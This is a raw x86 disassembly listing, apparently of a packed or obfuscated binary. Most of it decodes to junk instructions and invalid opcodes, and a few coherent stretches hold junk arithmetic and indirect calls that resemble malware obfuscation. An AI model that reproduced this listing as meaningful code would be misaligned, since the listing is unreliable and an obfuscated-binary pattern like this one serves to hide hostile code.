  408d10:	adc    ebx,DWORD PTR [ebx+0x208f99fa]
  408d16:	sbb    BYTE PTR [edi+ebp*1],dh
  408d19:	out    0x65,al
  408d1b:	mov    dh,0xa
  408d1d:	ret    0xd5e5
  408d20:	stos   DWORD PTR es:[edi],eax
  408d21:	pop    edi
  408d22:	scas   eax,DWORD PTR es:[edi]
  408d23:	shr    dl,0xf
  408d26:	pusha  
  408d27:	or     BYTE PTR [eax],al
  408d29:	xchg   ebx,eax
  408d2a:	scas   eax,DWORD PTR es:[edi]
  408d2b:	sbb    dl,BYTE PTR [esi-0x6]
  408d2e:	out    0xc0,al
  408d30:	push   es
  408d31:	pop    ebp
  408d32:	ret    
  408d33:	aam    0x8b
  408d35:	ret    
  408d36:	push   ecx
  408d37:	cmp    bl,cl
  408d39:	cmp    eax,0xbec6fb3d
  408d3e:	or     DWORD PTR [ebp+ebx*1+0x6b465901],ecx
  408d45:	std    
  408d46:	adc    ah,BYTE PTR [esi+0xc]
  408d49:	or     al,0xdd
  408d4b:	adc    ecx,DWORD PTR [eax]
  408d4d:	ds pop edx
  408d4f:	adc    edx,edx
  408d51:	sbb    DWORD PTR [edi-0x4e],ecx
  408d54:	lods   al,BYTE PTR ds:[esi]
  408d55:	popf   
  408d56:	or     DWORD PTR [esi-0x30f07609],esi
  408d5c:	ins    DWORD PTR es:[edi],dx
  408d5d:	popf   
  408d5e:	cmp    DWORD PTR [eax],ebp
  408d60:	xchg   edi,eax
  408d61:	xor    dh,cl
  408d63:	scas   al,BYTE PTR es:[edi]
  408d64:	lods   eax,DWORD PTR ds:[esi]
  408d65:	adc    al,0xfe
  408d67:	pop    es
  408d68:	jns    0x408d40
  408d6a:	imul   ebp,DWORD PTR [edx],0x6f0b4646
  408d70:	ins    BYTE PTR es:[edi],dx
  408d71:	add    ebx,0x318fb02
  408d77:	repnz pushf 
  408d79:	sub    eax,0x726f533c
  408d7e:	jecxz  0x408d6e
  408d80:	and    DWORD PTR [ebx+esi*4+0x6e],ebp
  408d84:	fs mov dh,0xbe
  408d87:	(bad)  
  408d88:	jmp    0x408dda
  408d8a:	out    dx,eax
  408d8b:	xchg   ecx,eax
  408d8c:	inc    eax
  408d8d:	loope  0x408d83
  408d8f:	(bad)  
  408d90:	pop    ecx
  408d91:	and    DWORD PTR [ebp-0x6d],ebx
  408d94:	outs   dx,DWORD PTR ds:[esi]
  408d95:	push   ebx
  408d96:	sbb    ch,BYTE PTR [eax]
  408d98:	pop    ebx
  408d99:	test   DWORD PTR [eax-0x3f2f0392],eax
  408d9f:	add    DWORD PTR [edx+0x3],esi
  408da2:	xor    ebx,esp
  408da4:	fidiv  DWORD PTR [ecx]
  408da6:	rol    BYTE PTR [ebx+eiz*1+0x7],0x2c
  408dab:	xchg   edi,eax
  408dac:	push   0x7
  408dae:	xor    DWORD PTR [edx-0x2d6875ec],edi
  408db4:	bnd jne 0x408ddb
  408db7:	mov    esp,0x3b1e22b2
  408dbc:	icebp  
  408dbd:	adc    DWORD PTR [edi+0x1d7e01be],0x6e
  408dc4:	sbb    DWORD PTR [ecx-0x1a437cbb],0xffffffc4
  408dcb:	aad    0x4c
  408dcd:	arpl   WORD PTR [eax],dx
  408dcf:	je     0x408e4b
  408dd1:	push   edi
  408dd2:	sbb    DWORD PTR [edi+0x27],esp
  408dd5:	sub    eax,0x8c4b58d8
  408dda:	test   al,0x12
  408ddc:	aas    
  408ddd:	scas   eax,DWORD PTR es:[edi]
  408dde:	sub    dh,BYTE PTR [esi]
  408de0:	jmp    0xe8de594d
  408de5:	dec    ebp
  408de6:	bound  edx,QWORD PTR [edx+eax*1-0x74]
  408dea:	and    edi,DWORD PTR [ebx+esi*2]
  408ded:	pop    edx
  408dee:	lahf   
  408def:	imul   edi,esp,0x15d88139
  408df5:	xor    bl,BYTE PTR [ebx-0x6bc1532e]
  408dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dfc:	aaa    
  408dfd:	mov    cl,0xa5
  408dff:	sbb    ebx,DWORD PTR [esi]
  408e01:	xor    eax,0x78c598fb
  408e06:	ror    BYTE PTR [eax-0x5e],cl
  408e09:	int    0x44
  408e0b:	adc    DWORD PTR [ebx-0x58],esi
  408e0e:	cdq    
  408e0f:	popf   
  408e10:	sbb    DWORD PTR [esi-0x5e39ba25],eax
  408e16:	dec    edx
  408e17:	in     eax,0xfc
  408e19:	xchg   edx,eax
  408e1a:	retf   0x3577
  408e1d:	xor    eax,0x8a748901
  408e22:	adc    DWORD PTR [ecx+edx*2],esi
  408e25:	xchg   ah,ah
  408e27:	adc    eax,0xc7758137
  408e2c:	inc    ecx
  408e2d:	out    0x8c,eax
  408e2f:	dec    eax
  408e30:	mov    WORD PTR [di],ss
  408e33:	xchg   ebx,eax
  408e34:	xchg   esp,eax
  408e35:	add    bh,dh
  408e37:	pusha  
  408e38:	xchg   ecx,eax
  408e39:	nop
  408e3a:	add    DWORD PTR [ecx+0x473d7cb4],ebx
  408e40:	sbb    edi,ecx
  408e42:	sbb    BYTE PTR [edx],al
  408e44:	xchg   edx,eax
  408e45:	push   ds
  408e46:	inc    edi
  408e47:	xor    edi,ebp
  408e49:	(bad)  
  408e4a:	mov    DWORD PTR [esi+0x2b],ebp
  408e4d:	jmp    0xaa7cdc1b
  408e52:	dec    edx
  408e53:	fsubr  QWORD PTR [edx+0x63]
  408e56:	pop    ebp
  408e57:	xchg   DWORD PTR [esi-0x71],eax
  408e5a:	dec    esp
  408e5b:	aad    0x86
  408e5d:	fsub   st,st(3)
  408e5f:	in     al,dx
  408e60:	mov    ds:0xb0ce353f,eax
  408e65:	ret    0x8216
  408e68:	fcomi  st,st(3)
  408e6a:	lahf   
  408e6b:	xor    eax,0x733bf9aa
  408e70:	dec    ebp
  408e71:	and    DWORD PTR [esi+0x6d7078da],0xffffffba
  408e78:	leave  
  408e79:	sbb    BYTE PTR [ebx+0x51ad65fc],0x83
  408e80:	in     al,dx
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x4283f9,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	sti    
  408eaf:	not    BYTE PTR [esi+ebx*4]
  408eb2:	jp     0x408f31
  408eb4:	mov    esi,0xbec279be
  408eb9:	mov    esi,0x8b0e9c60
  408ebe:	cmp    al,0xe4
  408ec0:	mul    BYTE PTR [edx-0x47]
  408ec3:	and    BYTE PTR ds:0xee15e7f5,al
  408ec9:	cmp    eax,0x5fe431b
  408ece:	out    0xbd,eax
  408ed0:	lahf   
  408ed1:	dec    edx
  408ed2:	add    eax,edx
  408ed4:	inc    esi
  408ed5:	dec    ebx
  408ed6:	xor    BYTE PTR fs:[ecx],0x2d
  408eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408edb:	retf   0x7fed
  408ede:	imul   ebx,DWORD PTR [esi-0x4b],0x670153ae
  408ee5:	push   ds
  408ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee7:	dec    esi
  408ee8:	push   esp
  408ee9:	repnz push 0x10
  408eec:	rol    DWORD PTR [ebp-0xac96b3d],cl
  408ef2:	fiadd  DWORD PTR [ebx]
  408ef4:	retf   0x4149
  408ef7:	ss push eax
  408ef9:	push   cs
  408efa:	js     0x408f14
  408efc:	imul   ecx,DWORD PTR [edi+0x5],0x28
  408f00:	sub    DWORD PTR [esi],ebp
  408f02:	cmp    dl,ah
  408f04:	out    0x94,eax
  408f06:	adc    al,0x12
  408f08:	xchg   ecx,eax
  408f09:	aaa    
  408f0a:	iret   
  408f0b:	xchg   edi,eax
  408f0c:	scas   eax,DWORD PTR es:[edi]
  408f0d:	add    bh,BYTE PTR [ecx+0x12]
  408f10:	daa    
  408f11:	or     DWORD PTR [esi-0xb],0x72
  408f15:	pusha  
  408f16:	push   esi
  408f17:	(bad)  
  408f19:	popf   
  408f1a:	repnz repz lds edi,FWORD PTR [edi-0x3ce6caa7]
  408f22:	imul   ebx,DWORD PTR [ebx-0x55],0xfffffff2
  408f26:	sub    eax,0x71a38f70
  408f2b:	iret   
  408f2c:	mov    ah,0xff
  408f2e:	xchg   ecx,eax
  408f2f:	pusha  
  408f30:	fld    DWORD PTR gs:[ecx-0x5fab7ab8]
  408f37:	hlt    
  408f38:	scas   al,BYTE PTR es:[edi]
  408f39:	not    BYTE PTR [esp+edi*2-0x718c3356]
  408f40:	cwde   
  408f41:	jmp    0x5f5:0x18fed718
  408f48:	mov    eax,0xc5b6d827
  408f4d:	enter  0x26cd,0x91
  408f51:	mov    esi,0xebe2c5b2
  408f56:	ins    DWORD PTR es:[edi],dx
  408f57:	mov    bh,0x21
  408f59:	retf   
  408f5a:	fsubr  DWORD PTR [ebp-0x7]
  408f5d:	(bad)  
  408f5f:	sbb    ch,BYTE PTR [edx]
  408f61:	mov    dl,0x8a
  408f63:	jmp    0x72e2:0xbda0939f
  408f6a:	retf   
  408f6b:	rcl    BYTE PTR [ebp+0x22bccb34],cl
  408f71:	fisttp QWORD PTR [esi]
  408f73:	pop    ebx
  408f74:	mov    ebx,DWORD PTR [esi+ebx*2+0x2f]
  408f78:	push   esp
  408f79:	(bad)  
  408f7b:	dec    eax
  408f7c:	fwait
  408f7d:	fwait
  408f7e:	mov    eax,ds:0xe57f378
  408f83:	jp     0x408f22
  408f85:	vmread esi,eax
  408f88:	xlat   BYTE PTR ds:[ebx]
  408f89:	outs   dx,BYTE PTR ds:[esi]
  408f8a:	xchg   ebx,eax
  408f8b:	loopne 0x408f94
  408f8d:	push   eax
  408f8e:	jl     0x408f6c
  408f90:	adc    ebx,ecx
  408f92:	push   ebx
  408f93:	lods   eax,DWORD PTR ds:[esi]
  408f94:	push   ebx
  408f95:	push   ss
  408f96:	cli    
  408f97:	jns    0x408f36
  408f99:	iret   
  408f9a:	call   0xc6e9:0x44739d7f
  408fa1:	xor    eax,DWORD PTR [ebx+eax*2-0x59]
  408fa5:	dec    ebp
  408fa6:	leave  
  408fa7:	xchg   BYTE PTR [ecx+0xa54b512],bh
  408fad:	int3   
  408fae:	in     eax,dx
  408faf:	sub    BYTE PTR [esi+0x30],dh
  408fb2:	cmp    DWORD PTR [edi+esi*8],esi
  408fb5:	das    
  408fb6:	test   DWORD PTR [ebp+edi*1+0x57603d54],esi
  408fbd:	cmp    al,0x31
  408fbf:	arpl   bx,si
  408fc1:	jo     0x408faf
  408fc3:	fwait
  408fc4:	inc    ebp
  408fc5:	std    
  408fc6:	xchg   BYTE PTR [esi-0x3f],al
  408fc9:	popf   
  408fca:	adc    BYTE PTR [ebx-0x1a],0xb8
  408fce:	mov    edi,0xfef01aaa
  408fd3:	and    BYTE PTR [esi],bl
  408fd5:	and    al,0xba
  408fd7:	push   ss
  408fd8:	out    dx,al
  408fd9:	pop    ss
  408fda:	add    DWORD PTR [ebp-0x62],eax
  408fdd:	out    dx,eax
  408fde:	inc    ebx
  408fdf:	inc    edx
  408fe0:	mov    edi,0xc29b8a5c
  408fe5:	fs push es
  408fe7:	mov    ebx,DWORD PTR [esi-0x1d]
  408fea:	or     eax,0x282deabc
  408fef:	inc    edx
  408ff0:	addr16 jp 0x409033
  408ff3:	popf   
  408ff4:	cld    
  408ff5:	cmp    BYTE PTR [ecx],dh
  408ff7:	ror    DWORD PTR [edx-0x3b6d5920],1
  408ffd:	add    al,0xfa
  408fff:	inc    esi
  409000:	xchg   eax,edi
  409002:	or     al,0xc
  409004:	cmp    BYTE PTR [esi+0x2101af55],dl
  40900a:	xor    ah,bh
  40900c:	sahf   
  40900d:	jno    0x409036
  40900f:	push   ebx
  409010:	(bad)
  409014:	push   eax
  409015:	cmp    ecx,esp
  409017:	je     0x408faf
  409019:	sahf   
  40901a:	mov    DWORD PTR [ecx],0xbd45aca
  409020:	fstp   TBYTE PTR ds:0xa678d694
  409026:	cwde   
  409027:	xor    esp,DWORD PTR [eax+0x1e]
  40902a:	repnz leave 
  40902c:	or     cl,BYTE PTR ss:[esi]
  40902f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409030:	(bad)  
  409031:	jne    0x409008
  409033:	div    edx
  409035:	adc    DWORD PTR ds:0xcfc81d7e,0xffffffb5
  40903c:	sbb    dh,ah
  40903e:	or     DWORD PTR [esi-0xd93b669],0xffffff95
  409045:	xor    al,0x11
  409047:	call   FWORD PTR [eax-0x72]
  40904a:	(bad)  
  40904c:	ret    
  40904d:	int3   
  40904e:	mov    eax,edi
  409050:	jmp    0xc626:0xff3d5133
  409057:	xor    DWORD PTR [eax-0x73],0x31eb46f
  40905e:	test   eax,0xe0a7eb6a
  409063:	jmp    0xa310929d
  409068:	clc    
  409069:	mov    edi,0x5cfd9dca
  40906e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40906f:	adc    DWORD PTR [ecx+0x33],ebx
  409072:	push   cs
  409073:	or     DWORD PTR [edi],ecx
  409075:	sbb    dl,dh
  409077:	pushf  
  409078:	add    eax,0xab18688b
  40907d:	pop    ecx
  40907e:	inc    edi
  40907f:	ss mov cl,0x50
  409082:	mov    ds:0x974dede2,al
  409087:	mov    cl,0xc4
  409089:	jecxz  0x4090e2
  40908b:	sbb    ebp,DWORD PTR [esi+0x44]
  40908e:	(bad)  
  40908f:	loopne 0x4090f1
  409091:	push   edx
  409092:	push   edi
  409093:	adc    edi,DWORD PTR [eax+0x3d]
  409096:	dec    ecx
  409097:	into   
  409098:	imul   esi,DWORD PTR [ebx+0x54],0x3cef198e
  40909f:	aam    0x36
  4090a1:	mov    bl,0xb1
  4090a3:	jbe    0x409110
  4090a5:	aad    0xbb
  4090a7:	push   es
  4090a8:	pop    esi
  4090a9:	xchg   DWORD PTR [ebx],esp
  4090ab:	dec    esi
  4090ac:	shl    BYTE PTR [ecx-0x633c88f4],1
  4090b2:	mov    bh,0x68
  4090b4:	sbb    al,0x36
  4090b6:	test   al,0x6b
  4090b8:	mov    ebp,0x6cf2f73b
  4090bd:	mov    dl,BYTE PTR [ebp-0x4997605a]
  4090c3:	push   esp
  4090c4:	sbb    ebx,DWORD PTR [edi]
  4090c6:	add    BYTE PTR [ebx+ecx*4+0x49],bh
  4090ca:	xlat   BYTE PTR ds:[ebx]
  4090cb:	in     eax,dx
  4090cc:	dec    ebp
  4090cd:	jae    0x4090c4
  4090cf:	faddp  st(7),st
  4090d1:	mov    eax,ds:0x8f2575ff
  4090d6:	sar    BYTE PTR [edi+0x1dd50051],0x50
  4090dd:	pop    eax
  4090de:	or     al,BYTE PTR [edx]
  4090e0:	mov    ebx,0x492bc014
  4090e5:	outs   dx,DWORD PTR ds:[esi]
  4090e6:	std    
  4090e7:	out    dx,eax
  4090e8:	retf   
  4090e9:	adc    al,dh
  4090eb:	dec    eax
  4090ec:	in     al,dx
  4090ed:	les    edi,FWORD PTR [esi+0x13d69cce]
  4090f3:	add    DWORD PTR [edi+0x75],0x96acb840
  4090fa:	jae    0x4090c4
  4090fc:	in     al,0xcc
  4090fe:	pop    ebp
  4090ff:	mov    ebx,0x41c6290e
  409104:	mov    dl,0x98
  409106:	imul   esp,DWORD PTR [eax-0x735af8c2],0xffffffff
  40910d:	pop    ecx
  40910e:	pandn  mm0,QWORD PTR [eax+0x71189aa5]
  409115:	lods   al,BYTE PTR ds:[esi]
  409116:	pop    esp
  409117:	push   ds
  409118:	ins    DWORD PTR es:[edi],dx
  409119:	int3   
  40911a:	or     dh,BYTE PTR [edi+eax*8-0x4a8d2fbb]
  409121:	jns    0x4090ee
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428521,0x0
  40912d:	mov    DWORD PTR ds:0x42851d,0x24a6
  409137:	mov    DWORD PTR ds:0x4283d1,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x428475,0x7db9
  409152:	cmp    DWORD PTR ds:0x428521,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x4280f7
  409169:	push   0x4282a3
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428319
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x4283b9,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428421
  409188:	add    DWORD PTR ds:0x4282f1,ecx
  40918e:	neg    DWORD PTR ds:0x4282e5
  409194:	xor    DWORD PTR ds:0x4284a5,ebx
  40919a:	or     DWORD PTR ds:0x4283d9,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x428369
  4091cb:	mov    eax,ds:0x4284dd
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x4282f1,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x4284a1
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x4284a1,0x428529
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x4284ad,0x4283c9
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x42849d,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x42849d,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x4284a9,0x4283c1
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x4283f1,0x42850d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x4283d5,0x428479
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428319,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x4283dd
  409280:	xor    esi,DWORD PTR ds:0x428415
  409286:	mov    DWORD PTR ds:0x4283dd,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428519
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	clc    
  4092a7:	stos   BYTE PTR es:[edi],al
  4092a8:	push   esi
  4092a9:	shl    DWORD PTR ds:0x79bebe83,1
  4092af:	ret    0xbebe
  4092b2:	outs   dx,BYTE PTR ds:[esi]
  4092b3:	inc    edi
  4092b4:	daa    
  4092b5:	fxch   st(2)
  4092b7:	jb     0x409337
  4092b9:	in     al,0x6e
  4092bb:	mov    ebp,0x358a9e29
  4092c0:	jg     0x4092f6
  4092c2:	add    al,0x18
  4092c4:	push   ebx
  4092c5:	loop   0x409336
  4092c7:	xchg   BYTE PTR [edx+0x4b],bh
  4092ca:	mov    ds:0x44ee2afd,eax
  4092cf:	cmp    DWORD PTR [ebx+edx*1-0x48f98186],0x85d8e1ee
  4092da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092db:	addr16 out dx,al
  4092dd:	sub    ch,al
  4092df:	cmp    ebp,DWORD PTR es:[edi-0x24]
  4092e3:	lods   al,BYTE PTR ds:[esi]
  4092e4:	rcl    edx,0x8c
  4092e7:	mov    fs,eax
  4092e9:	icebp  
  4092ea:	jmp    0x4092b6
  4092ec:	outs   dx,DWORD PTR ds:[esi]
  4092ed:	(bad)  
  4092ee:	and    eax,0xd8c73a4c
  4092f3:	out    0xa0,al
  4092f5:	es mov esp,0x9087f82f
  4092fb:	sbb    BYTE PTR [ecx+0x76],bh
  4092fe:	std    
  4092ff:	mov    ecx,ebx
  409301:	sbb    DWORD PTR [edi+0x405c7aa4],edx
  409307:	push   es
  409308:	out    dx,al
  409309:	aas    
  40930a:	cmp    ebp,edi
  40930c:	mov    ebx,0x2e8002c2
  409311:	imul   ebp,DWORD PTR [bx],0x5293d605
  409318:	scas   eax,DWORD PTR es:[edi]
  409319:	mov    cl,0xfe
  40931b:	cmp    dh,BYTE PTR [ebp+0x35c77c2c]
  409321:	sbb    al,0x14
  409323:	pop    ebp
  409324:	xor    al,0xac
  409326:	mov    ebp,fs
  409328:	je     0x409318
  40932a:	jnp    0x4092d3
  40932c:	call   0xad6170d0
  409331:	sub    esp,DWORD PTR [eax]
  409333:	das    
  409334:	addr16 or ecx,eax
  409337:	out    dx,al
  409338:	mul    ah
  40933a:	repnz cmc 
  40933c:	ins    BYTE PTR es:[edi],dx
  40933d:	cmp    BYTE PTR [ecx+0x1ed4ccab],dl
  409343:	sbb    al,0x4a
  409345:	adc    eax,0xa84096e9
  40934a:	xchg   edi,eax
  40934b:	dec    ebp
  40934c:	es inc edx
  40934e:	test   al,0xf2
  409350:	imul   edi,DWORD PTR [edi-0x7cb189d9],0x3c3c9178
  40935a:	enter  0xb0aa,0x6d
  40935e:	pushf  
  40935f:	sub    edx,DWORD PTR [eax-0x6a8acd89]
  409365:	pushf  
  409366:	cmp    BYTE PTR [edx-0x6f5bb61],bl
  40936c:	mov    ah,0x10
  40936e:	in     eax,dx
  40936f:	ret    0x6885
  409372:	lock aam 0xd8
  409375:	out    0x1,eax
  409377:	mov    ebx,0xbfde1006
  40937c:	bound  ecx,QWORD PTR [eax-0x6c22fe31]
  409382:	or     eax,0x9025a22e
  409387:	xor    edi,DWORD PTR [eax-0x188b73a]
  40938d:	inc    esi
  40938e:	jbe    0x409319
  409390:	rcl    esp,1
  409392:	mov    ch,BYTE PTR [edi+0x5f]
  409395:	and    ah,BYTE PTR [edi+esi*8]
  409398:	pop    eax
  409399:	sub    bh,BYTE PTR [ebx+0x60802a00]
  40939f:	stos   BYTE PTR es:[edi],al
  4093a0:	jns    0x409398
  4093a2:	xlat   BYTE PTR ds:[ebx]
  4093a3:	(bad)  
  4093a5:	pop    edi
  4093a6:	lock inc esp
  4093a8:	mov    al,ds:0xe69a6ecf
  4093ad:	sahf   
  4093ae:	pop    edi
  4093af:	adc    dl,BYTE PTR [edx+ebx*2]
  4093b2:	jle    0x40939e
  4093b4:	mov    ah,0xd5
  4093b6:	add    dh,bl
  4093b8:	adc    ebp,DWORD PTR [ecx+0x4b]
  4093bb:	lock std 
  4093bd:	(bad)  
  4093bf:	push   0xffffff84
  4093c1:	les    edi,FWORD PTR [eax+0x44c6d832]
  4093c7:	add    esp,ebp
  4093c9:	imul   esi,ebx,0x79
  4093cc:	inc    esp
  4093cd:	stc    
  4093ce:	jge    0x40939b
  4093d0:	adc    eax,0x3d251d1b
  4093d5:	jecxz  0x40936b
  4093d7:	mov    ah,0xe1
  4093d9:	iret   
  4093da:	mov    ebx,0x7741854a
  4093df:	sbb    DWORD PTR [ebp-0x29],ebx
  4093e2:	mov    bl,0x97
  4093e4:	add    al,0x8e
  4093e6:	mov    edx,0xd894137a
  4093eb:	add    al,0x7
  4093ed:	push   edx
  4093ee:	jg     0x409406
  4093f0:	push   0x4e7c1c7d
  4093f5:	xchg   BYTE PTR ds:0x4c74e301,dl
  4093fb:	inc    ecx
  4093fc:	or     al,0xc8
  4093ff:	adc    ch,BYTE PTR [ebx+0x37]
  409402:	or     eax,0x78085c00
  409407:	fimul  WORD PTR [esi]
  409409:	lods   al,BYTE PTR ds:[esi]
  40940a:	pop    edi
  40940b:	enter  0x8b84,0x5d
  40940f:	sbb    edx,DWORD PTR [eax-0x61b350d0]
  409415:	out    dx,eax
  409416:	or     ah,BYTE PTR [edi+ecx*8+0x4d]
  40941a:	mov    esi,0xddc21a6
  40941f:	loopne 0x409419
  409421:	xchg   esi,eax
  409422:	sub    eax,0xe62da99e
  409427:	dec    esp
  409428:	das    
  409429:	adc    BYTE PTR [eax+0x3d6f8d4e],ch
  40942f:	mov    WORD PTR [ebx-0x3376059a],ss
  409435:	jmp    0xcbb7edb2
  40943a:	jl     0x40949e
  40943c:	mov    esi,0x4f044b
  409442:	or     eax,0xfe061fa6
  409447:	mov    esp,DWORD PTR [ecx]
  409449:	jmp    0xae6e:0xe57a7d92
  409450:	dec    edx
  409451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409452:	and    eax,0x63c79f97
  409457:	mov    BYTE PTR [ecx+0x3c],al
  40945a:	adc    BYTE PTR [ebx],0xd8
  40945d:	pusha  
  40945e:	dec    ecx
  40945f:	pop    ebx
  409460:	fucomi st,st(1)
  409462:	inc    esi
  409463:	pop    ebp
  409464:	or     ecx,esp
  409466:	frstor [eax]
  409468:	inc    esp
  409469:	lods   eax,DWORD PTR ds:[esi]
  40946a:	test   bl,0x5
  40946d:	jl     0x4094a6
  40946f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409470:	inc    ebp
  409471:	dec    esp
  409472:	xchg   edx,eax
  409473:	cmp    DWORD PTR [edx],edi
  409475:	adc    al,0xcc
  409477:	or     ah,dh
  409479:	add    bh,BYTE PTR [esi-0x64fe58a7]
  40947f:	pop    esi
  409480:	xor    DWORD PTR [esi-0x39a0e2e8],0xa952ec5f
  40948a:	dec    esi
  40948b:	cmp    BYTE PTR [esi-0x56bf31b0],dh
  409491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409492:	lods   al,BYTE PTR ds:[esi]
  409493:	or     BYTE PTR [ecx],0x8e
  409496:	mov    ds:0x6d8c0d03,al
  40949b:	idiv   DWORD PTR [edi-0x2f]
  40949e:	fidiv  DWORD PTR [eax]
  4094a0:	jae    0x4094bb
  4094a2:	in     al,0x0
  4094a4:	outs   dx,DWORD PTR ds:[esi]
  4094a5:	(bad)  
  4094a6:	pushf  
  4094a7:	pop    esi
  4094a8:	mov    cs,WORD PTR [edx-0x1]
  4094ab:	rcr    BYTE PTR [edx-0x2bebf507],1
  4094b1:	push   0x4d
  4094b3:	aam    0xba
  4094b5:	pop    ebx
  4094b6:	imul   ecx,DWORD PTR [ebx-0x11],0xdcf3267
  4094bd:	push   ds
  4094be:	jmp    0x409481
  4094c0:	aam    0x7f
  4094c2:	arpl   WORD PTR [ecx],dx
  4094c4:	ret    
  4094c5:	je     0x409529
  4094c7:	frstor fs:[eax]
  4094ca:	adc    BYTE PTR [eax-0x63d260ad],ch
  4094d0:	jae    0x409452
  4094d2:	xchg   edx,eax
  4094d3:	cmp    cl,ah
  4094d5:	repz push edx
  4094d7:	inc    esp
  4094d8:	aad    0x78
  4094da:	fdiv   QWORD PTR [ecx+0x1f073143]
  4094e0:	ins    BYTE PTR es:[edi],dx
  4094e1:	adc    cl,cl
  4094e3:	pop    ebp
  4094e4:	sti    
  4094e5:	mov    edx,0x40678831
  4094ea:	and    BYTE PTR gs:[ebx+0x18fec9fe],al
  4094f1:	scas   al,BYTE PTR es:[edi]
  4094f2:	imul   ebp
  4094f4:	in     al,0xc1
  4094f6:	inc    esi
  4094f7:	pop    ecx
  4094f8:	cwde   
  4094f9:	adc    ch,ah
  4094fb:	retf   0x60cf
  4094fe:	adc    eax,0x6427f02e
  409503:	and    esp,DWORD PTR [ecx+0x68af64b6]
  409509:	dec    ebx
  40950a:	call   0x4cf6:0xd050d633
  409511:	pop    ds
  409512:	mov    al,0x97
  409514:	mov    esi,DWORD PTR [ebp-0x24]
  409517:	adc    DWORD PTR ds:0x4282fd,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x4282f1
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428501
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428401,0x42841d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x4282f5,0x4282fd
  409545:	call   0x422239
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x4283e9,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x4284f9,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x4283e5
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x4283e9,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428401
  40958b:	push   0x4282a3
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42850d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x4283fd
  4095a6:	or     ecx,DWORD PTR ds:0x428415
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x42849d,edx
  4095b4:	sbb    DWORD PTR ds:0x4283f1,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428415,0x428531
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
